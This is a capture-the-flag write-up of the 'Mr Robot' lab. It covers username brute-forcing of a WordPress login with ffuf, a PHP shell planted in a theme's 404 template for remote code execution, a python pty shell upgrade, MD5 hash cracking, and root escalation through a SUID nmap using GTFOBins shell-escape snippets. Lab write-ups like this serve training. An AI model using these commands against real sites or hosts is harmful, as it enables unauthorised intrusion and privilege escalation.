# MR ROBOT

The first step was to check the `robots.txt` file.

We discovered a wordlist there along with the first key! 😊

After some fuzzing and investigation, we found the `wp-login` page. When we tested `admin` with a random password as login credentials, it returned **"Invalid username"**.

That’s a _huge_ mistake! omg what to do now 😞 !\[\[Pasted image 20250105160237.png]]

start bruteforcing the username :)

```
ffuf -w fsocity.dic -u http://10.10.57.57/wp-login.php -X POST -d "log=FUZZ&pwd=randompassword&wp-submit=Log+In" -H "Content-Type: application/x-www-form-urlencoded" -mc all -fs 3584
```

OFC the username is Elliot , the password already found in the source code.

```
password = ER28-0652
```

After some research in Hacktricks Wordpress I found this :

### **Panel RCE**

**Modifying a php from the theme used (admin credentials needed)**

Appearance → Editor → 404 Template (at the right)

Change the content for a php shell:

![](https://hacktricks.boitatech.com.br/~gitbook/image?url=https%3A%2F%2F1116388331-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-Mks5MA8MikNk7jIq3z3%252Fsync%252F34081bf3a78aa2c1f724d60200556e1d57234101.png%3Fgeneration%3D1633028912918311%26alt%3Dmedia\&width=768\&dpr=4\&quality=100\&sign=2553e734\&sv=2)

Search in internet how can you access that updated page. In thi case you have to access here: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

I followed the steps and successfully achieved (RCE). upgrade shell :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

theres a password file in /home/robot

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

lets crack the hash :

<pre><code><strong>c3fcd3d76192e4007dfb496cca67e13b : abcdefghijklmnopqrstuvwxyz
</strong></code></pre>

Lets switch user to robot since we got the username and password

```
su robot
```

as robot we have acces to key 2 . Now lets privilege escalate , First lets check what root acces we got :

```shell
sudo -l
```

***

## FOCUS HERE

```shell
find / -perm +6000 -type f 2>/dev/null | grep /bin/
```

***

```
find / -perm +6000 -type f 2>/dev/null | grep /bin/
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/mail-touchlock
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/screen
/usr/bin/mail-unlock
/usr/bin/mail-lock
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/chfn
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/expiry
/usr/bin/dotlockfile
/usr/bin/sudo
/usr/bin/ssh-agent
/usr/bin/wall
/usr/local/bin/nmap # --------------Unusual directory or file ---------------------
```

Lets check https://gtfobins.github.io/gtfobins/nmap/ for any exploitation that maight help !

our Focus :

### Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

*   Input echo is disabled.

    ```
    TF=$(mktemp)
    echo 'os.execute("/bin/sh")' > $TF
    sudo nmap --script=$TF
    ```
*   The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.

    ```
    sudo nmap --interactive
    nmap> !sh
    ```

Unfortunately, we don't have access to `sudo`, so I tried running:

```shell
nmap --interactive 
nmap> sh 
#cd root
```

THATTTSS IITTTTT ! TYYY
